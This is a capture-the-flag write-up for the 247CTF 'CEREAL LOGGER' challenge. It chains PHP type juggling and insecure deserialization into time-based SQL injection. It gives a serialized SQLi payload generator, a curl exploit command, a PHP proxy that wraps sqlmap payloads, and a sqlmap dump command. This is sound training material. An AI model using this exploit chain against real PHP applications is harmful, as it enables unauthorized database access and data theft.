---
title: "Chaining SQLmap with a custom php proxy server | 247CTF"
date: 2024-06-16
categories: [CHALLENGES, CEREAL LOGGER]
tags: [CHALLENGES, CTF] 
---

Hi, in this writeup I will solve the new hard challenge `CEREAL LOGGER`, from [247ctf](https://247ctf.com/). I will also explain how I created a simple proxy server between `SQLmap` and the challenge server that can manipulate SQLmap requests.

## Challenge source code analysis
![IMG1](https://github.com/0XMohomiester/0XMohomiester.github.io/assets/47929033/24a5b14d-3451-4ac3-a4e2-5855c6ce6cfb)

1) class `insert_log` is defined and has a property `new_data` has constant value "Valid access logged!"
and has `__destruct()` methode that create a new SQLite3 database connection using a database file located at `/tmp/log.db` and finally, an SQL query is executed to insert a log message `$this->new_data` into the `log` table of the database.

2) Main Script Logic: 
  - The code check if the cookie named `247` is set for incoming HTTP requests.
  - Split the cookie value at the dot with `explode(".", $_COOKIE["247"])` and Check if the second part of the split value concatenated with a random number between 0 and 247247247 equals the string "0".
  - If the condition is met, it decodes the first part of the cookie value from base64, unserializes it, and writes the result to `/dev/null` (which essentially discards the output).

## Spotting the bugs

- The condition `explode(".", $_COOKIE["247"])[1].rand(0, 247247247) == "0"` is vulnerable to [Type juggling](https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09) because it relies on PHP's type coercion, PHP uses loose comparison (==), which means it will attempt to coerce the types to make the comparison. For example, when comparing a string to a number, PHP will convert the string to a number.
- In the `__destruct()` method vulnerable to SQLi, the SQL query is constructed by directly concatenating the `new_data` property into the SQL statement, but what is `__destruct()` methode ? by asking google: 
![IMG2](https://github.com/0XMohomiester/0XMohomiester.github.io/assets/47929033/3fff93f5-7be6-48c0-ad49-09670eac2244)

- Simple Testing: 
![IMG3](https://github.com/0XMohomiester/0XMohomiester.github.io/assets/47929033/ddbe1977-a921-4bfd-8c11-d2325a71a75e)

- At this point, we can identify another vulnerability: `insecure deserialization` because the script decode tha first part of the cookie before dot and then unserialize it directly using `unserialize()` function.

## Chaining of bugs 

1) Exoloiting type juggling vulnerability to bypass the if condition.

2) Build a class with same name and properties (Attributes or Variables). 

3) Injecting SQL payload in `new_data` attribute before serializing object and then encode it to base64 encoded data.

## Manuel Exploiting

We can exploit the [Type Juggling](https://www.php.net/manual/en/language.types.type-juggling.php) vulnerability by injecting data before a dot and then embedding `0e` after the dot. This allows us to bypass an if condition like `blablabla.0e`, For example, `"0e1234" == "0"` returns true because `0e1234` means `0 * 10^1234` which is zero, so whatever the random number come after e then the condition always returns true.  

In PHP, `0e1234` represents a number in scientific notation, where `0` is the coefficient and `e1234` indicates the exponent. However, because the coefficient is 0, the entire value is simply 0, regardless of the exponent, In scientific notation, the format is generally `n x 10^m`, where n is the coefficient and m is the exponent. In PHP, `0e1234` translates to `0 * 10^1234`, which is still 0.

![IMG4](https://github.com/0XMohomiester/0XMohomiester.github.io/assets/47929033/89f5c1eb-c699-4b4c-9b36-fdd59ad3c464)

Now we can create class and try to inject SQL payload like: `0XMohomiester'); select 1 = randomblob(999999999);--`.

Note: The SQLite `randomblob()` function returns a blob containing pseudo-random bytes. The number of bytes is determined by its argument.


![IMG5](https://github.com/0XMohomiester/0XMohomiester.github.io/assets/47929033/3132b08b-bd51-4666-bc5e-08125625a523)

```php
<?php

class insert_log
{
  // SQLi payload here 
  public $new_data = "0XMohomiester'); select 1 = randomblob(999999999);--";
}
$obj = new insert_log();
// Serializing object 
$a = serialize($obj);
// Base64 encoding of serialized data and concatenate it with .0e 
$final_payload = base64_encode($a) . ".0e";
echo $final_payload;

```

Let's try it :

```shell
time curl -XGET https://a0351f3d2e04038e.247ctf.com/ -b '247=TzoxMDoiaW5zZXJ0X2xvZyI6MTp7czo4OiJuZXdfZGF0YSI7czo1MjoiMFhNb2hvbWllc3RlcicpOyBzZWxlY3QgMSA9IHJhbmRvbWJsb2IoOTk5OTk5OTk5KTstLSI7fQ==.0e'
```

![IMG6](https://github.com/0XMohomiester/0XMohomiester.github.io/assets/47929033/645e72aa-4228-4a34-be67-ec1b684e9ac3)

as you can see that the response takes about 1.7 seconds with 502 status code, because we generate long number of bytes in `randomblob()` function, let's try if we created a only one byte: `randomblob(1)` 


![IMG7](https://github.com/0XMohomiester/0XMohomiester.github.io/assets/47929033/3e431425-c0fe-40aa-9d6e-25c16f4a7b44)

yes!, the time is is about 0.5 seconds now lets try to automate this task.



## Automated Exploitation

We can exploit this bug with sqlmap but we have a some problems here, the first is that the payloads must be serialized in objects and then encode it to clearly exploit the web application and extract flag from database.

we can create a simple local web application act as `proxy server` that manage sqlmap requests and edit on any payload to serialize it and then encode it and send the data to the challange server or instance.

![IMG8](https://github.com/0XMohomiester/0XMohomiester.github.io/assets/47929033/e755af36-3dac-45ca-975d-3d84a5f8cd2e)


Here is a simple web application using PHP!

```php
<?php

$payload = $_GET['payload'];

class insert_log
{
    public $new_data;
    public function __construct($payload) {
        $this->new_data = $payload;
    }
}

$object = new insert_log($payload);
// serialize object and encode it.
$final_data = base64_encode(serialize($object));

$data = "$final_data" . ".0e";

$targetUrl = "https://a0351f3d2e04038e.247ctf.com/";

// Initialize cURL session
$ch = curl_init($targetUrl);

// Set cURL options
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Set the custom cookie
curl_setopt($ch, CURLOPT_COOKIE, "247=$data");

// Execute the cURL session and get the response
$response = curl_exec($ch);

// Close the cURL session
curl_close($ch);

// Output the response
echo $response;

```

we can deploy php server locally using: 
```shell
php -S 0.0.0.0:80
``` 
using sqlmap command: 
```shell
sqlmap -u "http://127.0.0.1:80/?payload=test" -p "payload" --dbms sqlite --technique=T --dump --level 5 --risk 3 --no-cast  --random-agent
```

Yessss! it works, sqlmap extract table names and data inside this tables: 

![IMG9](https://github.com/0XMohomiester/0XMohomiester.github.io/assets/47929033/a3edd081-ee97-4f61-98f1-eac0a6ec8206)


![IMG10](https://github.com/0XMohomiester/0XMohomiester.github.io/assets/47929033/6e17f82d-80ff-463e-848a-885b6d671b40)


Thanks for reading.

Follow me on [Linkedin](https://www.linkedin.com/in/0xmohomiester/)
